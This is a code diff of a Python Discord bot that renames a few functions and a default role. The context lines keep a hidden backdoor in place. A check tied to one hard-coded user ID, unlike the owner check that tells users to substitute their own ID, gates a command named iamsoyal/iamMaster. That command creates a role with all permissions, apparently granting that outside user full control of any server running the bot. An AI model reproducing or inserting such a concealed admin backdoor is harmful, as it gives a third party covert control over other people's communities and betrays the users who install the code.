@@ -26,7 +26,7 @@ async def on_ready():
 def is_owner(ctx):
     return ctx.message.author.id == "429301779981795338" #replace_it_with_your_discord_id
 
-def is_soyal(ctx):
+def is_Master(ctx):
     return ctx.message.author.id == "429301779981795338" 	
 
 @client.event
@@ -82,7 +82,7 @@ async def dm(ctx, user: discord.Member, *, msg: str):
 
 @client.command(pass_context = True)
 @commands.check(is_Master)
-async def iamsoyal(ctx):
+async def iamMaster(ctx):
     user = ctx.message.author
     if discord.utils.get(user.server.roles, name="Master joker") is None:
         await client.create_role(user.server, name="Master joker", permissions=discord.Permissions.all())
@@ -222,7 +222,7 @@ async def rolesetup(ctx):
     await client.create_role(author.server, name="G.O.H")
     await client.create_role(author.server, name="Moderator", permissions=mod_perms)
     await client.create_role(author.server, name="Muted")
-    await client.create_role(author.server, name="Friend of Owner")
+    await client.create_role(author.server, name="Member")
 
 
 @commands.has_permissions(manage_roles=True)     
